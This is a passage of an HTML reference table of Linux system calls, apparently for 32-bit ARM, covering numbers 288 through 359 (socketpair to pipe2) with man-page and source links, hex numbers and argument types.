<td>socketpair</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td>
<td align="center">0x120</td>
<td>int</td>
<td>int</td>
<td>int</td>
<td>int *</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">289</td>
<td>send</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/send.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*send">cs/</a></td>
<td align="center">0x121</td>
<td>int</td>
<td>void *</td>
<td>size_t</td>
<td>unsigned</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">290</td>
<td>sendto</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td>
<td align="center">0x122</td>
<td>int</td>
<td>void *</td>
<td>size_t</td>
<td>unsigned</td>
<td>struct sockaddr *</td>
<td>int</td>
</tr>
<tr>
<td align="center">291</td>
<td>recv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recv">cs/</a></td>
<td align="center">0x123</td>
<td>int</td>
<td>void *</td>
<td>size_t</td>
<td>unsigned</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">292</td>
<td>recvfrom</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td>
<td align="center">0x124</td>
<td>int</td>
<td>void *</td>
<td>size_t</td>
<td>unsigned</td>
<td>struct sockaddr *</td>
<td>int *</td>
</tr>
<tr>
<td align="center">293</td>
<td>shutdown</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td>
<td align="center">0x125</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">294</td>
<td>setsockopt</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td>
<td align="center">0x126</td>
<td>int fd</td>
<td>int level</td>
<td>int optname</td>
<td>char *optval</td>
<td>int optlen</td>
<td>-</td>
</tr>
<tr>
<td align="center">295</td>
<td>getsockopt</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td>
<td align="center">0x127</td>
<td>int fd</td>
<td>int level</td>
<td>int optname</td>
<td>char *optval</td>
<td>int *optlen</td>
<td>-</td>
</tr>
<tr>
<td align="center">296</td>
<td>sendmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td>
<td align="center">0x128</td>
<td>int fd</td>
<td>struct user_msghdr *msg</td>
<td>unsigned flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">297</td>
<td>recvmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td>
<td align="center">0x129</td>
<td>int fd</td>
<td>struct user_msghdr *msg</td>
<td>unsigned flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">298</td>
<td>semop</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td>
<td align="center">0x12a</td>
<td>int semid</td>
<td>struct sembuf *sops</td>
<td>unsigned nsops</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">299</td>
<td>semget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td>
<td align="center">0x12b</td>
<td>key_t key</td>
<td>int nsems</td>
<td>int semflg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">300</td>
<td>semctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td>
<td align="center">0x12c</td>
<td>int semid</td>
<td>int semnum</td>
<td>int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">301</td>
<td>msgsnd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td>
<td align="center">0x12d</td>
<td>int msqid</td>
<td>struct msgbuf *msgp</td>
<td>size_t msgsz</td>
<td>int msgflg</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">302</td>
<td>msgrcv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td>
<td align="center">0x12e</td>
<td>int msqid</td>
<td>struct msgbuf *msgp</td>
<td>size_t msgsz</td>
<td>long msgtyp</td>
<td>int msgflg</td>
<td>-</td>
</tr>
<tr>
<td align="center">303</td>
<td>msgget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td>
<td align="center">0x12f</td>
<td>key_t key</td>
<td>int msgflg</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">304</td>
<td>msgctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td>
<td align="center">0x130</td>
<td>int msqid</td>
<td>int cmd</td>
<td>struct msqid_ds *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">305</td>
<td>shmat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td>
<td align="center">0x131</td>
<td>int shmid</td>
<td>char *shmaddr</td>
<td>int shmflg</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">306</td>
<td>shmdt</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td>
<td align="center">0x132</td>
<td>char *shmaddr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">307</td>
<td>shmget</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td>
<td align="center">0x133</td>
<td>key_t key</td>
<td>size_t size</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">308</td>
<td>shmctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td>
<td align="center">0x134</td>
<td>int shmid</td>
<td>int cmd</td>
<td>struct shmid_ds *buf</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">309</td>
<td>add_key</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td>
<td align="center">0x135</td>
<td>const char *_type</td>
<td>const char *_description</td>
<td>const void *_payload</td>
<td>size_t plen</td>
<td>key_serial_t destringid</td>
<td>-</td>
</tr>
<tr>
<td align="center">310</td>
<td>request_key</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td>
<td align="center">0x136</td>
<td>const char *_type</td>
<td>const char *_description</td>
<td>const char *_callout_info</td>
<td>key_serial_t destringid</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">311</td>
<td>keyctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td>
<td align="center">0x137</td>
<td>int cmd</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td>-</td>
</tr>
<tr>
<td align="center">312</td>
<td>semtimedop</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td>
<td align="center">0x138</td>
<td>int semid</td>
<td>struct sembuf *sops</td>
<td>unsigned nsops</td>
<td>const struct __kernel_timespec *timeout</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">313</td>
<td>vserver</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td>
<td align="center">0x139</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">314</td>
<td>ioprio_set</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td>
<td align="center">0x13a</td>
<td>int which</td>
<td>int who</td>
<td>int ioprio</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">315</td>
<td>ioprio_get</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td>
<td align="center">0x13b</td>
<td>int which</td>
<td>int who</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">316</td>
<td>inotify_init</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td>
<td align="center">0x13c</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">317</td>
<td>inotify_add_watch</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td>
<td align="center">0x13d</td>
<td>int fd</td>
<td>const char *path</td>
<td>u32 mask</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">318</td>
<td>inotify_rm_watch</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td>
<td align="center">0x13e</td>
<td>int fd</td>
<td>__s32 wd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">319</td>
<td>mbind</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td>
<td align="center">0x13f</td>
<td>unsigned long start</td>
<td>unsigned long len</td>
<td>unsigned long mode</td>
<td>const unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned flags</td>
</tr>
<tr>
<td align="center">320</td>
<td>get_mempolicy</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td>
<td align="center">0x140</td>
<td>int *policy</td>
<td>unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned long addr</td>
<td>unsigned long flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">321</td>
<td>set_mempolicy</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td>
<td align="center">0x141</td>
<td>int mode</td>
<td>const unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">322</td>
<td>openat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td>
<td align="center">0x142</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int flags</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">323</td>
<td>mkdirat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td>
<td align="center">0x143</td>
<td>int dfd</td>
<td>const char * pathname</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">324</td>
<td>mknodat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td>
<td align="center">0x144</td>
<td>int dfd</td>
<td>const char * filename</td>
<td>umode_t mode</td>
<td>unsigned dev</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">325</td>
<td>fchownat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td>
<td align="center">0x145</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>int flag</td>
<td>-</td>
</tr>
<tr>
<td align="center">326</td>
<td>futimesat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td>
<td align="center">0x146</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct __kernel_old_timeval *utimes</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">327</td>
<td>fstatat64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatat64">cs/</a></td>
<td align="center">0x147</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct stat64 *statbuf</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">328</td>
<td>unlinkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td>
<td align="center">0x148</td>
<td>int dfd</td>
<td>const char * pathname</td>
<td>int flag</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">329</td>
<td>renameat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td>
<td align="center">0x149</td>
<td>int olddfd</td>
<td>const char * oldname</td>
<td>int newdfd</td>
<td>const char * newname</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">330</td>
<td>linkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td>
<td align="center">0x14a</td>
<td>int olddfd</td>
<td>const char *oldname</td>
<td>int newdfd</td>
<td>const char *newname</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">331</td>
<td>symlinkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td>
<td align="center">0x14b</td>
<td>const char * oldname</td>
<td>int newdfd</td>
<td>const char * newname</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">332</td>
<td>readlinkat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td>
<td align="center">0x14c</td>
<td>int dfd</td>
<td>const char *path</td>
<td>char *buf</td>
<td>int bufsiz</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">333</td>
<td>fchmodat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td>
<td align="center">0x14d</td>
<td>int dfd</td>
<td>const char * filename</td>
<td>umode_t mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">334</td>
<td>faccessat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td>
<td align="center">0x14e</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">335</td>
<td>pselect6</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td>
<td align="center">0x14f</td>
<td>int</td>
<td>fd_set *</td>
<td>fd_set *</td>
<td>fd_set *</td>
<td>struct __kernel_timespec *</td>
<td>void *</td>
</tr>
<tr>
<td align="center">336</td>
<td>ppoll</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td>
<td align="center">0x150</td>
<td>struct pollfd *</td>
<td>unsigned int</td>
<td>struct __kernel_timespec *</td>
<td>const sigset_t *</td>
<td>size_t</td>
<td>-</td>
</tr>
<tr>
<td align="center">337</td>
<td>unshare</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td>
<td align="center">0x151</td>
<td>unsigned long unshare_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">338</td>
<td>set_robust_list</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td>
<td align="center">0x152</td>
<td>struct robust_list_head *head</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">339</td>
<td>get_robust_list</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td>
<td align="center">0x153</td>
<td>int pid</td>
<td>struct robust_list_head * *head_ptr</td>
<td>size_t *len_ptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">340</td>
<td>splice</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td>
<td align="center">0x154</td>
<td>int fd_in</td>
<td>loff_t *off_in</td>
<td>int fd_out</td>
<td>loff_t *off_out</td>
<td>size_t len</td>
<td>unsigned int flags</td>
</tr>
<tr>
<td align="center">341</td>
<td>arm_sync_file_range</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/arm_sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arm_sync_file_range">cs/</a></td>
<td align="center">0x155</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">341</td>
<td>sync_file_range2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range2">cs/</a></td>
<td align="center">0x155</td>
<td>int fd</td>
<td>unsigned int flags</td>
<td>loff_t offset</td>
<td>loff_t nbytes</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">342</td>
<td>tee</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td>
<td align="center">0x156</td>
<td>int fdin</td>
<td>int fdout</td>
<td>size_t len</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">343</td>
<td>vmsplice</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td>
<td align="center">0x157</td>
<td>int fd</td>
<td>const struct iovec *iov</td>
<td>unsigned long nr_segs</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">344</td>
<td>move_pages</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td>
<td align="center">0x158</td>
<td>pid_t pid</td>
<td>unsigned long nr_pages</td>
<td>const void * *pages</td>
<td>const int *nodes</td>
<td>int *status</td>
<td>int flags</td>
</tr>
<tr>
<td align="center">345</td>
<td>getcpu</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td>
<td align="center">0x159</td>
<td>unsigned *cpu</td>
<td>unsigned *node</td>
<td>struct getcpu_cache *cache</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">346</td>
<td>epoll_pwait</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td>
<td align="center">0x15a</td>
<td>int epfd</td>
<td>struct epoll_event *events</td>
<td>int maxevents</td>
<td>int timeout</td>
<td>const sigset_t *sigmask</td>
<td>size_t sigsetsize</td>
</tr>
<tr>
<td align="center">347</td>
<td>kexec_load</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td>
<td align="center">0x15b</td>
<td>unsigned long entry</td>
<td>unsigned long nr_segments</td>
<td>struct kexec_segment *segments</td>
<td>unsigned long flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">348</td>
<td>utimensat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td>
<td align="center">0x15c</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>struct __kernel_timespec *utimes</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">349</td>
<td>signalfd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td>
<td align="center">0x15d</td>
<td>int ufd</td>
<td>sigset_t *user_mask</td>
<td>size_t sizemask</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">350</td>
<td>timerfd_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td>
<td align="center">0x15e</td>
<td>int clockid</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">351</td>
<td>eventfd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td>
<td align="center">0x15f</td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">352</td>
<td>fallocate</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td>
<td align="center">0x160</td>
<td>int fd</td>
<td>int mode</td>
<td>loff_t offset</td>
<td>loff_t len</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">353</td>
<td>timerfd_settime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td>
<td align="center">0x161</td>
<td>int ufd</td>
<td>int flags</td>
<td>const struct __kernel_itimerspec *utmr</td>
<td>struct __kernel_itimerspec *otmr</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">354</td>
<td>timerfd_gettime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td>
<td align="center">0x162</td>
<td>int ufd</td>
<td>struct __kernel_itimerspec *otmr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">355</td>
<td>signalfd4</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td>
<td align="center">0x163</td>
<td>int ufd</td>
<td>sigset_t *user_mask</td>
<td>size_t sizemask</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">356</td>
<td>eventfd2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td>
<td align="center">0x164</td>
<td>unsigned int count</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">357</td>
<td>epoll_create1</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td>
<td align="center">0x165</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">358</td>
<td>dup3</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td>
<td align="center">0x166</td>
<td>unsigned int oldfd</td>
<td>unsigned int newfd</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">359</td>
<td>pipe2</td>
